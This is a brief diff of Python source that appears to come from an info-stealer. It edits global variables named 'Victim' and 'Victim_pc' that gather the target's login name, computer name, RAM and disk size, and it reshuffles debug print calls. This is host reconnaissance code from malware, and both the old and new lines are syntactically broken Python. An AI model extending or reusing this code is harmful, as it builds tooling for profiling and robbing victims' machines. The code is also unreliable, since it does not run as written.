@@ -57,10 +57,10 @@ __config__ = {
 
 }
 # global variables
-Victim = os.getlogin(); if fetch_conf('dev'): print("Setting up Victim var")
-Victim_pc = os.getenv("COMPUTERNAME") if fetch_conf('dev'): print("Setting up Victim_pc var")
-ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0] if fetch_conf('dev'): print("Setting up ram var")
-disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0] if fetch_conf('dev'): print("Setting up disk var")
+Victim = os.getlogin(); print("Setting up Victim var") if fetch_conf('dev') 
+Victim_pc = os.getenv("COMPUTERNAME"); print("Setting up Victim_pc var") if fetch_conf('dev')
+ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]; print("Setting up ram var") if fetch_conf('dev')
+disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]; print("Setting up disk var") if fetch_conf('dev')
 
 
 class Functions(object):
